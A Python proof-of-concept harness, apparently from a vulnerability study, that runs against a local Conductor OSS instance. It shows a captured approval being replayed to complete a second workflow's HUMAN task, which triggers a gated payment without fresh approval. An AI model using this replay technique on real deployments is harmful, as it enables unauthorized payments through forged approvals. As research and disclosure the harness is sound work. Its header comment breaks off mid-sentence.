#!/usr/bin/env python3
# APF / APF - REPLAY reproduction harness: Conductor OSS (#36)
#
# Restore path: approval = the output of a HUMAN task, supplied via the Task Update /
# queue update API, persisted in Conductor's durable store. The completion body
# (approved, approver) becomes the task output with NO run/nonce binding and a
# self-asserted approver. This harness drives the REAL Conductor REST API: it takes a
# genuine approval on workflow A, then reuses that same approval body to complete
# workflow B's HUMAN task, firing the gated INLINE pay task under Priya with no fresh
#
# Self-proving: verdict derived from Conductor's own workflow output on run B.
#
# Usage:
#   pip install requests
#   docker compose up -d      # wait until /health is healthy (first boot 1-2 min)
#   python3 harness_conductor.py
import sys, os, time, json
import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import apf_common as C

BASE = os.environ.get("CONDUCTOR_BASE", "http://localhost:8080/api")
OUT = os.path.join(os.environ.get("APF_EVIDENCE_BASE", os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "evidence")), "36_conductor")
WF_NAME = "apf_payment"

WORKFLOW_DEF = {
    "name": WF_NAME, "version": 1, "schemaVersion": 2, "ownerEmail": "apf@example.com",
    "inputParameters": ["amount", "beneficiary"],
    "tasks": [
        {"name": "wait_for_approval", "taskReferenceName": "wait_for_approval",
         "type": "HUMAN", "inputParameters": {}},
        {"name": "pay", "taskReferenceName": "pay", "type": "INLINE",
         "inputParameters": {
             "evaluatorType": "graaljs",
             "approved": "${wait_for_approval.output.approved}",
             "approver": "${wait_for_approval.output.approver}",
             "amount": "${workflow.input.amount}",
             "beneficiary": "${workflow.input.beneficiary}",
             "expression": "(function(){ return $.approved === true ? {paid:true, amount:$.amount, beneficiary:$.beneficiary, approver:$.approver} : {paid:false}; })();"
         }},
    ],
    "outputParameters": {
        "paid": "${pay.output.result.paid}", "amount": "${pay.output.result.amount}",
        "beneficiary": "${pay.output.result.beneficiary}", "approver": "${pay.output.result.approver}"},
}


def wait_health(tries=120):
    # conductor-standalone bundles ES + Redis + server; first boot can take several minutes.
    # Accept either /health OK or the metadata API answering.
    root = BASE.replace("/api", "")
    for _ in range(tries):
        try:
            r = requests.get(root + "/health", timeout=5)
            if r.ok:
                return
        except requests.RequestException:
            pass
        try:
            r = requests.get(BASE + "/metadata/workflow", timeout=5)
            if r.status_code in (200, 404):
                return
        except requests.RequestException:
            pass
        time.sleep(3)
    raise SystemExit("Conductor did not become healthy in time at " + root)


def register_workflow():
    r = requests.put(BASE + "/metadata/workflow", json=[WORKFLOW_DEF], timeout=30)
    if r.status_code not in (200, 204):
        # some builds want POST for create
        r = requests.post(BASE + "/metadata/workflow", json=WORKFLOW_DEF, timeout=30)
        if r.status_code not in (200, 204, 409):
            raise SystemExit("workflow register failed: %s %s" % (r.status_code, r.text[:300]))


def start_workflow(amount, beneficiary):
    r = requests.post(BASE + "/workflow",
                      json={"name": WF_NAME, "version": 1,
                            "input": {"amount": amount, "beneficiary": beneficiary}}, timeout=30)
    if not r.ok:
        raise SystemExit("start failed: %s %s" % (r.status_code, r.text[:300]))
    return r.text.strip().strip('"')


def get_workflow(wid):
    return requests.get(BASE + "/workflow/" + wid + "?includeTasks=true", timeout=15).json()


def wait_human_ready(wid, tries=60):
    for _ in range(tries):
        wf = get_workflow(wid)
        for t in wf.get("tasks", []):
            if t.get("referenceTaskName") == "wait_for_approval" and t.get("status") == "IN_PROGRESS":
                return wf
        if wf.get("status") in ("FAILED", "TERMINATED", "COMPLETED"):
            return wf
        time.sleep(1)
    raise SystemExit("HUMAN task did not reach IN_PROGRESS for %s" % wid)


def complete_human(wid, approved, approver):
    # body becomes the HUMAN task output; API performs no approval-provenance check
    r = requests.post(BASE + "/tasks/" + wid + "/wait_for_approval/COMPLETED",
                      json={"approved": approved, "approver": approver}, timeout=30)
    return r.status_code


def wait_done(wid, tries=60):
    for _ in range(tries):
        wf = get_workflow(wid)
        if wf.get("status") in ("COMPLETED", "FAILED", "TERMINATED"):
            return wf
        time.sleep(1)
    return get_workflow(wid)


def main():
    wait_health()
    register_workflow()
    audit = []

    # ---- control: genuine approval on workflow A ----
    widA = start_workflow(C.A_ARGS["amount"], C.A_ARGS["beneficiary"])
    wait_human_ready(widA)
    complete_human(widA, True, C.APPROVER)               # genuine approver acts
    wfA = wait_done(widA)
    outA = wfA.get("output", {})
    if outA.get("paid"):
        audit.append({"action": "execute_payment", "amount": outA.get("amount"),
                      "beneficiary": outA.get("beneficiary"), "approved_by_in_audit": outA.get("approver")})
    C.line("control", f"genuine approval by {C.APPROVER} -> workflow output: {json.dumps(outA)}")

    genuine = {"approved": True, "approver": C.APPROVER}
    C.line("audit", f"reusable HUMAN-task approval body (no run/nonce binding): {genuine}")

    # ---- replay: reuse run A's approval body to complete run B's HUMAN task ----
    widB = start_workflow(C.B_ARGS["amount"], C.B_ARGS["beneficiary"])
    wait_human_ready(widB)
    complete_human(widB, genuine["approved"], genuine["approver"])   # reused approver identity
    wfB = wait_done(widB)
    outB = wfB.get("output", {})
    replay_fired = bool(outB.get("paid")) and outB.get("beneficiary") == C.B_ARGS["beneficiary"] \
        and outB.get("approver") == C.APPROVER
    b_row = None
    if replay_fired:
        b_row = {"action": "execute_payment", "amount": outB.get("amount"),
                 "beneficiary": outB.get("beneficiary"), "approved_by_in_audit": outB.get("approver")}
        audit.append(b_row)
    C.line("replay", f"reused run A approval completed run B -> workflow output: {json.dumps(outB)}")

    seen = set(); nonce = "n-runA-0036"

    verdict = C.verdict_from_state(replay_fired)
    C.line("verdict", verdict)
    h = C.emit_evidence("Conductor OSS", OUT, {
        "restore_path": "approval = HUMAN task output via Task Update API, persisted in durable store; self-asserted approver, no run/nonce binding",
        "conductor_image": "conductoross/conductor-standalone:3.15.6",
        "genuine_run": widA, "replay_run": widB,
        "replay_fired": replay_fired, "replayed_payment": b_row,
        "workflow_output_runA": outA, "workflow_output_runB": outB,
        "audit_ledger": audit, "verdict": verdict,
    })
    print("EVIDENCE_HASH16", h)


if __name__ == "__main__":
    C.guarded_main('Conductor', OUT, main)
